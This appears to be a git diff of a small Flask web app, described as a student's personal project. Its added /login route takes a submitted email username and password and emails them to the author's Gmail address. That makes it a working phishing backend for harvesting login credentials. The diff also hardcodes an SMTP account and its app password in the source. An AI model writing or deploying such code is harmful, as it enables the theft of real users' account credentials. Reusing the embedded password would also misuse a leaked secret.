@@ -1,44 +1,64 @@
 from flask import Flask, render_template, redirect, request
 import requests
 from flask_mail import Mail, Message
+import os 
 
+
+# Created by Mohammed Draem 
+# Computer software engineer student at Make School, San Francisco , CA
+# Personal Project 
 
 
 
 app = Flask(__name__)
+# https://pythonhosted.org/Flask-Mail/
+app.config['MAIL_SERVER'] = 'smtp.gmail.com' # smtp.gmail.com is base on the extension of my email @gmail.com
+app.config['MAIL_USE_SSL'] = True # ssl is for incomming mail
+# app.config['MAIL_USE_TLS'] = True # Outgoing mail
+app.config['MAIL_PORT'] = 465 # incomming mail port
+app.config['MAIL_USERNAME'] = "mdrame1133@gmail.com" # your email goes here 
+app.config['MAIL_PASSWORD'] = "ybqknebqodfwhibnmd" # app key from you email provider ( google is currently a 16 character )
 
-app.config['MAIL_SERVER'] = 'mail.prettyprinted.com'
-app.config['MAIL_PORT'] = 465
-app.config['MAIL_USE_SSL'] = True
-app.config.from_pyfile('config.cfg')
 
-mail = Mail(app)
+# # envaromental variables don't work 
+# app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME')
+# app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD')
+
+
+
+
+mail = Mail(app) # mail instance / object 
 
 
 # home route 
 @app.route('/')
 def index():
     
-    return render_template('index.html')
+    return render_template('index.html') #home page
     
+
+
 
 # user hit login button
 ''' Create a route that takes both GET and POST methods
-and render the info in the input to desire destination '''
+and render the info in the input to desire destination. for me that destination is my email lol'''
 
 @app.route('/login', methods = ['POST', 'GET'] )
 def login():
 
-    #passing credential as message to my email
+    
 
-    # git user credential from form only if they enter something
+   # user email form form
     userName = request.form.get("emailUsername")
-    password = request.form.get("password")
+    # ! password with 2 ds so you don't get your variable mixed up
+    passwordd = request.form.get("password")
   
     #Form Validation will be done in front end in the html.
 
-    print(userName)
-    print(password)
+    #passing credential as message to my email
+    mes = Message(f"Email_User: {userName}, Password: {passwordd}", sender="mdrame1133@gmail.com", recipients=['mdrame113@gmail.com'])
+    mail.send(mes)
+    
             
 
     
@@ -62,4 +82,4 @@ def test():
 
 # main module page 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=False) 
